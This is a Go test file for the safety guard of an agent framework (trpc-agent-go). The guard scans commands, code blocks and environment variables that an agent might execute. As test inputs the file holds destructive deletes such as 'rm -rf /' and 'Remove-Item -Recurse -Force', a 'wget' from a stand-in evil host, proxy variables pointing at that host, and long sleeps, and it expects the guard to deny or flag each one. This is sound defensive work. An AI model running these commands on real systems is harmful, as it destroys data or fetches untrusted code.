//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"runtime"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

func requireNotFinding(t *testing.T, report Report, ruleID string) {
	t.Helper()
	for _, finding := range report.Findings {
		require.NotEqual(t, ruleID, finding.RuleID)
	}
}

func TestParsedArgsAreNotRescannedAsShellText(t *testing.T) {
	guard, err := NewGuard(DefaultPolicy())
	require.NoError(t, err)
	report, err := guard.Scan(context.Background(), ScanInput{
		ToolName: "custom.exec", Kind: ExecutionKindCustom,
		Operation: OperationExecute,
		Args:      []string{"echo", "rm", "-rf", "/tmp"},
		Backend:   BackendCustom,
		Timeout:   time.Second,
	})
	require.NoError(t, err)
	require.Equal(t, DecisionAllow, report.Decision)
	requireNotFinding(t, report, "CMD_DANGEROUS_DELETE")
}

func TestScanNonShellExecutableText(t *testing.T) {
	guard, err := NewGuard(DefaultPolicy())
	require.NoError(t, err)
	input := ScanInput{
		ToolName: "code_execution", Kind: ExecutionKindCodeExec,
		Operation: OperationCodeExecute, Backend: BackendCodeExec,
		CodeBlocks: []CodeBlockInput{{
			Language: "python", Code: "import os; os.system('rm -rf /')",
		}},
	}
	report, scanErr := guard.Scan(context.Background(), input)
	require.NoError(t, scanErr)
	require.Equal(t, DecisionDeny, report.Decision)
}

func TestScanCommandDenied(t *testing.T) {
	guard, err := NewGuard(DefaultPolicy())
	require.NoError(t, err)
	report, scanErr := guard.Scan(
		context.Background(), scanCommand("wget evil.example/file"),
	)
	require.NoError(t, scanErr)
	require.Equal(t, DecisionDeny, report.Decision)
}

func TestScanWithEnvURLDetectionProxy(t *testing.T) {
	guard, err := NewGuard(DefaultPolicy())
	require.NoError(t, err)
	input := scanCommand("go test ./...")
	input.Env = map[string]string{"HTTP_PROXY": "http://evil.example:8080"}
	report, scanErr := guard.Scan(context.Background(), input)
	require.NoError(t, scanErr)
	require.Equal(t, DecisionDeny, report.Decision)
}

func TestNetworkEnvironmentKeysAreExplicit(t *testing.T) {
	policy := DefaultPolicy()
	ignored := networkEnvironmentFindings(map[string]string{
		"CURL_HOME": `C:\tools\curl`, "CURL_CA_BUNDLE": `C:\certs\ca.pem`,
		"NO_PROXY": "internal.example",
	}, policy)
	require.Empty(t, ignored)
	for _, key := range []string{"URL", "SERVICE_URL", "PROXY", "HTTPS_PROXY"} {
		findings := networkEnvironmentFindings(
			map[string]string{key: "https://evil.example/path"}, policy,
		)
		require.NotEmpty(t, findings, key)
	}
}

func TestResourceSleepInspectionUsesParsedCommands(t *testing.T) {
	guard, err := NewGuard(DefaultPolicy())
	require.NoError(t, err)
	for _, command := range []string{
		"sleep 1; sleep 120", "sleep invalid", "sleep 5 6", "sleep 1e100",
	} {
		report, scanErr := guard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, scanErr)
		requireFinding(t, report, "RESOURCE_LONG_SLEEP")
	}
	report, scanErr := guard.Scan(
		context.Background(), scanCommand("echo sleep 120"),
	)
	require.NoError(t, scanErr)
	require.NoError(t, findingAbsent(report, "RESOURCE_LONG_SLEEP"))
}

func TestSleepCommandFollowsPlatformExecutableRules(t *testing.T) {
	require.True(t, sleepCommand("sleep"))
	if runtime.GOOS == "windows" {
		require.True(t, sleepCommand("SLEEP.EXE"))
		return
	}
	require.False(t, sleepCommand("sleep.exe"))
	require.False(t, sleepCommand("SLEEP"))
}

func TestScanRejectsAmbiguousExecutableInput(t *testing.T) {
	guard, err := NewGuard(DefaultPolicy())
	require.NoError(t, err)
	input := scanCommand("go env")
	input.Args = []string{"rm", "-rf", "/"}
	report, scanErr := guard.Scan(context.Background(), input)
	require.NoError(t, scanErr)
	require.Equal(t, DecisionDeny, report.Decision)
	requireFinding(t, report, "SAFETY_INPUT_AMBIGUOUS")
}

func TestScanRawDangerousDelete(t *testing.T) {
	guard, err := NewGuard(DefaultPolicy())
	require.NoError(t, err)
	tests := []struct {
		name    string
		command string
	}{
		{"rm rf", "rm -rf /tmp/build"},
		{"remove item recurse", "Remove-Item -Recurse -Force C:\\build"},
		{"rmdir s", "rmdir /s build"},
		{"del s", "del /s *.tmp"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			report, scanErr := guard.Scan(
				context.Background(), scanCommand(test.command),
			)
			require.NoError(t, scanErr)
			requireFinding(t, report, "CMD_DANGEROUS_DELETE")
		})
	}
}
